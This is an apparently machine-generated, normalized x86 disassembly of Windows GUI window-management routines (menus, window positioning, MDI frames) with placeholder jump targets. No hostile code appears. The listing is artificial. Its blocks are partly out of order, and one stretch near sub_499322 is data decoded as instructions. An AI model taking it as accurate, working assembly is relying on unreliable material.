call sub_499bf4
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x29e ] 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_498473
lea eax [ ebp - 0x10 ]
call j_sub_4068a0
retn
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x29e ] 0x1
je r-xdata
mov eax ebx
call sub_47a060
test al al
je r-xdata
cmp [ ebx + 0x34 ] 0x0
je r-xdata
mov eax ebx
call sub_47a060
test al al
je r-xdata
mov eax [ ebx + 0x2b4 ]
mov edx [ eax ]
call [ edx + 0x38 ]
mov edi eax
mov eax ebx
call sub_479ce0
push eax
call GetMenu
cmp edi eax
je r-xdata
push 0x37
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_479ce0
push eax
call SetWindowPos
push 0x0
xor ecx ecx
mov edx 0x85
mov eax ebx
call sub_472314
push 0x0
xor ecx ecx
mov edx 0xf
mov eax ebx
call sub_472314
push 0x0
mov eax ebx
call sub_479ce0
push eax
call SetMenu
jmp r-xdata
mov eax ebx
call sub_479ce0
mov edx eax
mov eax esi
call sub_4611c4
jmp r-xdata
mov eax [ ebx + 0x2b4 ]
mov edx [ eax ]
call [ edx + 0x38 ]
push eax
mov eax ebx
call sub_479ce0
push eax
call SetMenu
sub_4984e0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_49847c
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test esi esi
je r-xdata
test [ ebx + 0x1c ] 0x1
je r-xdata
cmp esi 0x24
jl r-xdata
mov [ ebx + 0x2c4 ] esi
cmp [ ebx + 0x2c4 ] 0x0
je r-xdata
sub_498530
push ebx
mov ebx eax
cmp dl [ ebx + 0x348 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x348 ] dl
cmp dl 0x1
jne r-xdata
xor eax eax
mov [ ebx + 0x358 ] eax
xor eax eax
mov [ ebx + 0x35c ] eax
mov eax ebx
call sub_47a060
test al al
je r-xdata
cmp [ ebx + 0x34c ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor edx edx
mov eax ebx
call sub_498584
mov eax ebx
call sub_4761e4
sub_498584
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x34c ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
cmp ebx esi
je r-xdata
test eax eax
je r-xdata
mov [ ebx + 0x34c ] esi
test esi esi
je r-xdata
mov edx ebx
call sub_43c510
xor eax eax
mov [ ebx + 0x358 ] eax
xor eax eax
mov [ ebx + 0x35c ] eax
mov eax ebx
call sub_47a060
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_43c22c
mov [ ebx + 0x348 ] 0x2
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_4761e4
sub_4985f4
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_4985e8
cmp bl al
je r-xdata
pop esi
pop ebx
retn
xor eax eax
mov [ esi + 0x2c4 ] eax
test bl bl
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov [ esi + 0x2c4 ] eax
sub_498660
push ebx
mov ebx eax
mov eax ebx
call sub_4790e4
cmp [ ebx + 0x1e9 ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0xff00000f
jne r-xdata
mov eax ebx
call sub_498648
cmp eax [ ebx + 0x6c ]
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_498648
mov edx eax
mov eax ebx
call sub_470fdc
mov edx 0xff00000f
mov eax ebx
call sub_470fdc
pop ebx
retn
sub_4986e4
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x29a ]
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x29a ] bl
test [ esi + 0x1c ] 0x10
jne r-xdata
cmp [ esi + 0x1ea ] 0x0
je r-xdata
movzx eax bl
mov eax [ eax * 4 + rw-data ]
push eax
mov eax esi
call sub_479ce0
push eax
call ShowWindow
sub_498724
push ebx
push esi
push edi
push ebp
add esp 0xffffffd8
mov esi eax
movzx eax [ esi + 0x2a0 ]
test al al
je r-xdata
add esp 0x28
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ rw-data ]
cmp [ edx + 0x44 ] 0x0
je r-xdata
xor edx edx
mov [ esp ] edx
cmp al 0x2
jne r-xdata
movzx eax [ esi + 0x2a0 ]
cmp al 0x3
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_497f38
mov eax [ eax + 0x4 ]
mov [ esp ] eax
jmp r-xdata
cmp al 0x1
jne r-xdata
mov edx [ rw-data ]
cmp [ edx + 0x64 ] 0x0
je r-xdata
mov eax esi
call sub_497f38
mov eax [ eax + 0x4 ]
mov [ esp + 0x4 ] eax
mov eax [ rw-data ]
call sub_49d540
dec eax
test eax eax
jl r-xdata
mov eax [ rw-data ]
call sub_49e85c
mov eax [ eax + 0x4 ]
mov [ esp ] eax
mov eax [ rw-data ]
mov eax [ eax + 0x64 ]
call sub_497f38
mov eax [ eax + 0x4 ]
mov [ esp ] eax
jmp r-xdata
inc eax
mov [ esp + 0x14 ] eax
xor edi edi
inc edi
dec [ esp + 0x14 ]
jne r-xdata
mov eax [ esp ]
cmp eax [ esp + 0x4 ]
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_49d52c
mov eax [ eax + 0x4 ]
cmp eax [ esp ]
jne r-xdata
cmp [ esi + 0x29f ] 0x4
jne r-xdata
mov eax [ rw-data ]
call sub_49d540
mov ebp eax
dec ebp
test ebp ebp
jl r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_49d52c
lea edx [ esp + 0x18 ]
call sub_49d128
mov eax [ esi + 0x48 ]
push eax
mov eax [ esi + 0x4c ]
push eax
mov ecx [ esp + 0x2c ]
sub ecx [ esp + 0x24 ]
sub ecx [ esi + 0x4c ]
sar ecx 0x1
jns r-xdata
inc ebp
mov [ esp + 0x8 ] 0x0
add ecx [ esp + 0x24 ]
mov edx [ esp + 0x28 ]
mov ebp [ esp + 0x20 ]
sub edx ebp
sub edx [ esi + 0x48 ]
sar edx 0x1
jns r-xdata
adc ecx 0x0
inc [ esp + 0x8 ]
dec ebp
jne r-xdata
movzx eax [ esi + 0x29f ]
cmp al 0x4
jne r-xdata
add edx ebp
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x98 ]
adc edx 0x0
mov edx [ esp + 0x8 ]
mov eax [ rw-data ]
call sub_49d52c
mov eax [ eax + 0x4 ]
cmp eax [ esp + 0x4 ]
jne r-xdata
jmp r-xdata
cmp al 0x6
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_49d52c
lea edx [ esp + 0x18 ]
call sub_49d128
mov eax [ esi + 0x48 ]
push eax
mov eax [ esi + 0x4c ]
push eax
mov ecx [ esp + 0x2c ]
sub ecx [ esp + 0x24 ]
sub ecx [ esi + 0x4c ]
sar ecx 0x1
jns r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_49d52c
call sub_49d090
mov ebx eax
mov eax esi
call sub_496864
add ebx eax
mov edx [ esp + 0x8 ]
mov eax [ rw-data ]
call sub_49d52c
call sub_49d090
sub ebx eax
mov [ esp + 0xc ] ebx
mov edx edi
mov eax [ rw-data ]
call sub_49d52c
call sub_49d090
mov ebx eax
mov edx edi
mov eax [ rw-data ]
call sub_49d52c
call sub_49d0dc
add ebx eax
mov eax [ esp + 0xc ]
add eax [ esi + 0x48 ]
cmp ebx eax
jge r-xdata
mov eax [ esi + 0x48 ]
push eax
mov eax [ esi + 0x4c ]
push eax
mov edx edi
mov eax [ rw-data ]
call sub_49d52c
call sub_49d0c4
mov ebx eax
mov edx edi
mov eax [ rw-data ]
call sub_49d52c
call sub_49d0a8
sub eax [ esi + 0x4c ]
sar eax 0x1
jns r-xdata
add ecx [ esp + 0x24 ]
mov edx [ esp + 0x28 ]
sub edx [ esp + 0x20 ]
sub edx [ esi + 0x48 ]
sar edx 0x1
jns r-xdata
adc ecx 0x0
mov edx edi
mov eax [ rw-data ]
call sub_49d52c
call sub_49d0c4
mov ebx eax
mov eax esi
call sub_496884
add ebx eax
mov edx [ esp + 0x8 ]
mov eax [ rw-data ]
call sub_49d52c
call sub_49d0c4
sub ebx eax
mov [ esp + 0x10 ] ebx
mov edx edi
mov eax [ rw-data ]
call sub_49d52c
call sub_49d0c4
mov ebx eax
mov edx edi
mov eax [ rw-data ]
call sub_49d52c
call sub_49d0a8
add ebx eax
mov eax [ esp + 0x10 ]
add eax [ esi + 0x4c ]
cmp ebx eax
jge r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_49d52c
call sub_49d090
mov ebx eax
mov edx edi
mov eax [ rw-data ]
call sub_49d52c
call sub_49d0dc
add ebx eax
sub ebx [ esi + 0x48 ]
mov [ esp + 0xc ] ebx
add ebx eax
push ebx
mov edx edi
mov eax [ rw-data ]
call sub_49d52c
call sub_49d090
mov ebx eax
mov edx edi
mov eax [ rw-data ]
call sub_49d52c
call sub_49d0dc
sub eax [ esi + 0x48 ]
sar eax 0x1
jns r-xdata
adc eax 0x0
add edx [ esp + 0x20 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x98 ]
jmp r-xdata
adc edx 0x0
mov eax [ esi + 0x48 ]
push eax
mov eax [ esi + 0x4c ]
push eax
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x98 ]
mov edx edi
mov eax [ rw-data ]
call sub_49d52c
call sub_49d0c4
mov ebx eax
mov edx edi
mov eax [ rw-data ]
call sub_49d52c
call sub_49d0a8
add ebx eax
sub ebx [ esi + 0x4c ]
mov [ esp + 0x10 ] ebx
add ebx eax
mov edx ebx
mov eax esi
pop ecx
mov ebx [ eax ]
call [ ebx + 0x98 ]
jmp r-xdata
adc eax 0x0
sub_498ad0
push ebx
push eax
call GetParent
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
test ebx ebx
jne r-xdata
push 0xffffffec
push ebx
call GetWindowLongW
and eax 0x80
cmp eax 0x80
je r-xdata
mov eax ebx
pop ebx
retn
mov eax [ rw-data ]
mov ebx [ eax + 0x44 ]
test ebx ebx
je r-xdata
push ebx
call GetParent
mov ebx eax
mov eax [ rw-data ]
mov ebx [ eax + 0x170 ]
push 0xffffffec
mov eax ebx
call sub_479ce0
push eax
call GetWindowLongW
test al 0x80
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_479ce0
mov ebx eax
jmp r-xdata
sub_498b40
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
call sub_4953c0
mov edx edi
mov eax ebx
call sub_49c644
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
mov [ edi + 0x24 ] 0x8
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x1d4 ] 0x0
jne r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
xor esi esi
test [ ebx + 0x1c ] 0x10
je r-xdata
movzx eax [ ebx + 0x29f ]
dec eax
sub al 0x2
jae r-xdata
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
or [ edi + 0x4 ] 0xcf0000
jmp r-xdata
test [ ebx + 0x384 ] 0x8
je r-xdata
mov al 0x2
jmp r-xdata
lea eax [ edi + 0x24 ]
push eax
lea ecx [ edi + 0x8 ]
lea edx [ edi + 0x4 ]
mov eax ebx
mov si 0xffa9
call sub_40587c
movzx eax [ ebx + 0x299 ]
cmp [ ebx + 0x29e ] 0x1
jne r-xdata
mov [ edi + 0xc ] 0x80000000
mov [ edi + 0x10 ] 0x80000000
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x29e ] 0x0
jne r-xdata
cmp [ ebx + 0x348 ] 0x0
jne r-xdata
mov ebp [ ebx + 0x358 ]
test ebp ebp
jne r-xdata
mov edx eax
sub dl 0x2
je r-xdata
mov edx eax
test dl dl
je r-xdata
xor eax eax
movzx eax [ ebx + 0x348 ]
jmp r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebx + 0x35c ]
test eax eax
je r-xdata
cmp [ ebx + 0x35c ] 0x0
jne r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
sub dl 0x3
jne r-xdata
mov al 0x2
sub dl 0x3
jne r-xdata
mov esi ebp
mov eax ebp
call sub_479ce0
mov [ edi + 0x1c ] eax
mov [ edi + 0x1c ] eax
jmp r-xdata
sub al 0x1
jb r-xdata
movzx edx [ ebx + 0x29f ]
sub dl 0x1
je r-xdata
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
sub al 0x3
jae r-xdata
mov eax [ edi + 0x1c ]
mov edx [ rw-data ]
cmp eax [ edx + 0x170 ]
je r-xdata
mov eax esi
call sub_498490
mov edx ebx
call sub_430608
test eax eax
jge r-xdata
test esi esi
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0xd3 ] 0x0
je r-xdata
je r-xdata
mov [ edi + 0x14 ] 0x80000000
mov [ edi + 0x18 ] 0x80000000
sub dl 0x2
jne r-xdata
mov [ ebx + 0x29a ] 0x0
test [ ebx + 0x1c ] 0x10
jne r-xdata
and [ edi + 0x4 ] 0xbffcffff
mov [ ebx + 0x35c ] eax
mov edx esi
mov eax ebx
call sub_43c22c
mov [ ebx + 0x358 ] esi
jmp r-xdata
mov eax esi
call sub_498490
mov edx ebx
call sub_4303e0
mov eax [ rw-data ]
mov ebp [ eax + 0x170 ]
mov [ edi + 0x1c ] ebp
push 0xffffffec
push ebp
call GetWindowLongW
and eax 0xffffff7f
push eax
push 0xffffffec
push ebp
call SetWindowLongW
jmp r-xdata
cmp [ ebx + 0x370 ] 0x0
jne r-xdata
cmp [ ebx + 0x370 ] 0x0
je r-xdata
dec al
je r-xdata
cmp [ ebx + 0x29e ] 0x1
jne r-xdata
and [ edi + 0x4 ] 0xff3fffff
test [ ebx + 0x1d ] 0x2
je r-xdata
movzx eax [ ebx + 0x29a ]
cmp al 0x1
jne r-xdata
xor eax eax
mov [ edi + 0x1c ] eax
jmp r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x44 ]
jne r-xdata
mov eax [ rw-data ]
call sub_4a20a0
mov [ edi + 0x1c ] eax
xor eax eax
mov [ edi + 0x1c ] eax
jmp r-xdata
mov ebp [ ebx + 0x34c ]
test ebp ebp
je r-xdata
jmp r-xdata
lea ecx [ edi + 0x8 ]
lea edx [ edi + 0x4 ]
mov eax ebx
mov si 0xffaa
call sub_40587c
mov eax [ rw-data ]
cmp [ eax + 0xd3 ] 0x0
je r-xdata
mov eax DefMDIChildProcW
mov [ edi + 0x28 ] eax
cmp al 0x2
jne r-xdata
mov eax [ rw-data ]
cmp [ eax + 0xd3 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov ebp [ eax + 0x44 ]
test ebp ebp
je r-xdata
mov ebp [ edi + 0x1c ]
test ebp ebp
je r-xdata
mov eax [ edi + 0x1c ]
call sub_494028
test eax eax
jne r-xdata
cmp [ edi + 0x1c ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_4a20ec
mov [ edi + 0x1c ] eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_4969b0
test al al
je r-xdata
cmp [ ebx + 0x370 ] 0x0
jne r-xdata
or [ edi + 0x4 ] 0x1000000
jmp r-xdata
or [ edi + 0x4 ] 0x20000000
jmp r-xdata
cmp [ ebx + 0x370 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x170 ]
mov [ edi + 0x1c ] eax
jmp r-xdata
mov eax ebp
call sub_47a060
test al al
je r-xdata
mov eax [ edi + 0x1c ]
test eax eax
je r-xdata
push 0xffffffec
push ebp
call GetWindowLongW
and eax 0x80
cmp eax 0x80
jne r-xdata
xor eax eax
mov [ edi + 0x1c ] eax
mov eax [ edi + 0x1c ]
push eax
call IsWindowVisible
test eax eax
je r-xdata
test eax eax
jne r-xdata
mov edx [ rw-data ]
cmp [ edx + 0x44 ] 0x0
je r-xdata
mov eax ebp
call sub_479ce0
mov [ edi + 0x1c ] eax
mov esi [ ebx + 0x34c ]
jmp r-xdata
cmp [ ebx + 0x29a ] 0x2
jne r-xdata
or [ edi + 0x8 ] 0x40000
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
mov [ eax + 0xdc ] 0x1
jmp r-xdata
mov eax [ rw-data ]
call sub_4a20ec
mov ebp eax
mov [ edi + 0x1c ] ebp
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_479ce0
cmp ebp eax
jne r-xdata
test eax eax
jne r-xdata
mov edx [ rw-data ]
cmp [ edx + 0x68 ] 0x0
je r-xdata
mov eax [ edi + 0x1c ]
call sub_498ad0
mov [ edi + 0x1c ] eax
mov eax [ edi + 0x1c ]
push eax
call IsWindowEnabled
test eax eax
jne r-xdata
mov eax [ rw-data ]
mov ebp [ eax + 0x170 ]
mov [ edi + 0x1c ] ebp
mov eax [ rw-data ]
cmp [ eax + 0xd3 ] 0x0
jne r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x44 ]
cmp eax [ edx + 0x258 ]
jne r-xdata
mov eax [ edi + 0x1c ]
test eax eax
je r-xdata
mov eax [ ebx + 0x2d4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
mov ecx [ ebx + 0x2d0 ]
xor edx edx
xor eax eax
call sub_40ab90
mov eax [ edi + 0x8 ]
push eax
cmp [ ebx + 0x2b4 ] 0x0
setne al
neg al
sbb eax eax
push eax
mov eax [ edi + 0x4 ]
push eax
lea eax [ esp + 0xc ]
push eax
call AdjustWindowRectEx
test eax eax
je r-xdata
cmp [ ebx + 0x29e ] 0x1
je r-xdata
test [ ebx + 0x55 ] 0x20
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_498490
mov edx ebx
call sub_430608
test eax eax
jge r-xdata
mov eax [ rw-data ]
cmp [ eax + 0xd3 ] 0x0
je r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x68 ]
cmp eax [ edx + 0x258 ]
jne r-xdata
push 0xffffffec
push ebp
call GetWindowLongW
and eax 0xffffff7f
push eax
push 0xffffffec
push ebp
call SetWindowLongW
jmp r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x44 ]
jmp r-xdata
mov eax [ esp + 0x8 ]
sub eax [ esp ]
mov [ edi + 0x14 ] eax
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
mov [ edi + 0x18 ] eax
mov eax [ rw-data ]
cmp ebx [ eax + 0x44 ]
jne r-xdata
mov eax [ rw-data ]
mov edx [ eax + 0x44 ]
mov eax ebx
call sub_43c22c
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_498490
mov edx ebx
call sub_4303e0
mov eax [ rw-data ]
mov ebp [ eax + 0x170 ]
mov [ edi + 0x1c ] ebp
push 0xffffffec
push ebp
call GetWindowLongW
and eax 0xffffff7f
push eax
push 0xffffffec
push ebp
call SetWindowLongW
jmp r-xdata
cmp [ ebx + 0x370 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x68 ]
jmp r-xdata
xor eax eax
mov [ edi + 0x1c ] eax
jmp r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x44 ]
jne r-xdata
mov eax [ rw-data ]
mov ebp [ eax + 0x44 ]
test ebp ebp
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x170 ]
mov [ edi + 0x1c ] eax
jmp r-xdata
mov eax ebp
call sub_47a060
test al al
je r-xdata
mov eax [ rw-data ]
call sub_4a20ec
mov ebp eax
mov [ edi + 0x1c ] ebp
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_479ce0
cmp ebp eax
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_498490
mov edx ebx
call sub_430608
test eax eax
jge r-xdata
mov eax [ rw-data ]
mov edx [ eax + 0x44 ]
mov eax ebx
call sub_43c22c
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_498490
mov edx ebx
call sub_4303e0
sub_49913c
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_4953d0
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp [ ebx + 0x299 ] 0x3
je r-xdata
mov eax [ ebx + 0x350 ]
test eax eax
je r-xdata
movzx eax [ ebx + 0x29e ]
sub al 0x2
je r-xdata
push 0x0
push 0x1
push 0x80
mov eax ebx
call sub_479ce0
push eax
call __imp_SendMessageW
mov eax ebx
call sub_499d68
push eax
push 0x1
push 0x80
mov eax ebx
call sub_479ce0
push eax
call SendMessageW
jmp r-xdata
mov eax [ ebx + 0x354 ]
call sub_40875c
mov edi eax
test edi edi
jl r-xdata
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov [ esp + 0x4 ] 0xff00
xor eax eax
mov [ esp ] eax
mov esi [ ebx + 0x2c0 ]
test esi esi
je r-xdata
dec al
je r-xdata
push 0x0
lea eax [ ebx + 0x354 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_40891c
add esp 0x4
test [ ebx + 0x1c ] 0x1
jne r-xdata
inc edi
xor esi esi
mov eax [ ebx + 0x350 ]
mov edx [ eax ]
call [ edx + 0x8 ]
inc edi
xor esi esi
push 0x56330001
push 0x0
push 0x0
mov eax ebx
call sub_47074c
push eax
mov eax ebx
call sub_47078c
push eax
mov eax ebx
call sub_479ce0
push eax
push 0x0
mov eax [ rw-data ]
push eax
lea eax [ esp + 0x20 ]
push eax
mov edx r-xdata
xor ecx ecx
mov eax 0x200
call sub_40c5c8
mov [ ebx + 0x37c ] eax
push ebx
push sub_4974b4
call sub_4944d4
mov [ ebx + 0x380 ] eax
push 0xfffffffc
mov eax [ ebx + 0x37c ]
push eax
call GetWindowLongW
mov [ ebx + 0x2dc ] eax
mov eax [ ebx + 0x380 ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x37c ]
push eax
call SetWindowLongW
jmp r-xdata
mov eax esi
call sub_45c284
mov [ esp ] eax
push 0x13
push 0x0
push 0x0
push 0x0
push 0x0
push 0xffffffff
mov eax ebx
call sub_479ce0
push eax
call SetWindowPos
jmp r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x374 ]
call sub_4a25fc
test al al
je r-xdata
mov eax [ ebx + 0x258 ]
push eax
mov eax [ ebx + 0x354 ]
mov eax [ eax + esi * 8 ]
push eax
push 0xb049
mov eax [ ebx + 0x354 ]
mov eax [ eax + esi * 8 + 0x4 ]
push eax
call SendMessageW
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebx + 0x350 ]
call sub_4305a0
call sub_4763e8
inc esi
dec edi
jne r-xdata
xor edx edx
mov eax ebx
call sub_49c7e4
sub_499322
add [ eax ] al
dec ebp
add [ eax + eax + 0x49 ] al
add [ ebx ] al
dec esp
add [ ecx ] cl
inc ebp
add [ esi ] cl
push esp
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xffffff0c
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xf4 ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_499460
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x29e ] 0x1
jne r-xdata
mov esi edx
lea edi [ ebp - 0xf0 ]
mov ecx 0x33
[ edi ] [ esi ]
and [ ebp - 0xe8 ] 0xfff7ffff
lea edx [ ebp - 0xf0 ]
mov eax ebx
call sub_475cc0
and [ ebx + 0x384 ] 0xef
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
lea edx [ ebp - 0xf4 ]
mov eax [ rw-data ]
call sub_40a204
mov ecx [ ebp - 0xf4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4160ac
call sub_4060b0
cmp [ eax + 0x37c ] 0x0
jne r-xdata
mov eax ebx
call sub_49c4f0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_499467
lea eax [ ebp - 0xf4 ]
call j_sub_4068a0
retn
lea eax [ edx + 0x4c ]
mov [ ebp - 0x24 ] eax
mov eax [ edx ]
mov [ ebp - 0x20 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x1c ] eax
mov eax [ edx + 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ edx + 0x10 ]
mov [ ebp - 0x14 ] eax
mov eax [ edx + 0x14 ]
mov [ ebp - 0x10 ] eax
mov eax [ edx + 0x18 ]
mov [ ebp - 0xc ] eax
mov eax [ edx + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ edx + 0x20 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x24 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x37c ]
xor ecx ecx
mov edx 0x220
call sub_40c9e8
mov [ ebx + 0x258 ] eax
or [ ebx + 0x384 ] 0x10
jmp r-xdata
sub_499470
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp ebx [ esi ]
je r-xdata
or eax 0xffffffff
pop esi
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_46d414
test eax eax
jne r-xdata
push 0x4
push ebx
call GetWindow
cmp eax [ esi ]
jne r-xdata
push 0x0
movzx eax [ esi + 0x4 ]
push eax
push 0xb04a
push ebx
call __imp_SendMessageW
sub_4994b4
push ebp
mov ebp esp
add esp 0xffffffe8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x258 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_476170
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x344 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x258 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x55 ] 0x20
setne al
mov [ ebp - 0x10 ] al
lea eax [ ebp - 0x14 ]
push eax
push sub_499470
call GetCurrentThreadId
push eax
call EnumThreadWindows
mov eax [ ebp - 0x4 ]
call sub_4984b8
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x344 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x8 ] 0x0
mov eax [ ebp - 0x4 ]
test [ eax + 0x55 ] 0x20
je r-xdata
xor eax eax
push ebp
push sub_49959a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x344 ]
mov edx [ ebp - 0x8 ]
call sub_4305a0
mov edx eax
mov eax [ ebp - 0xc ]
call sub_4303e0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x344 ]
mov edx [ ebp - 0x8 ]
call sub_4305a0
mov edx [ eax ]
call [ edx + 0xc0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x55 ] 0x20
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x344 ]
mov edx [ ebp - 0x8 ]
call sub_4305a0
mov dl 0x1
call sub_47ba3c
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x344 ]
mov edx [ ebp - 0x8 ]
call sub_4305a0
xor edx edx
call sub_47ba3c
sub_4995e8
push ebx
mov ebx eax
test [ ebx + 0x384 ] 0x10
je r-xdata
mov eax ebx
call sub_475f5c
push 0x0
mov eax ebx
call sub_479ce0
push eax
push 0x221
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x37c ]
push eax
call __imp_SendMessageW
jmp r-xdata
xor eax eax
mov [ ebx + 0x37c ] eax
pop ebx
retn
sub_49962c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x37c ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_476f74
cmp [ esi ] 0x5
jne r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax [ ebx + 0x37c ]
push eax
mov eax ebx
call sub_479ce0
push eax
call DefFrameProcW
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax ebx
call sub_479ce0
push eax
call DefWindowProcW
mov [ esi + 0xc ] eax
jmp r-xdata
pop esi
pop ebx
retn
sub_499690
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_499740
push [ fs : eax ]
mov [ fs : eax ] esp
cmp edi [ ebx + 0x290 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_499747
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
test edi edi
je r-xdata
mov [ ebx + 0x290 ] edi
test [ ebx + 0x1c ] 0x1
jne r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp [ ebx + 0x29d ] 0x0
je r-xdata
cmp ebx edi
je r-xdata
mov eax ebx
mov si 0xffaf
call sub_40587c
mov eax ebx
call sub_499ac8
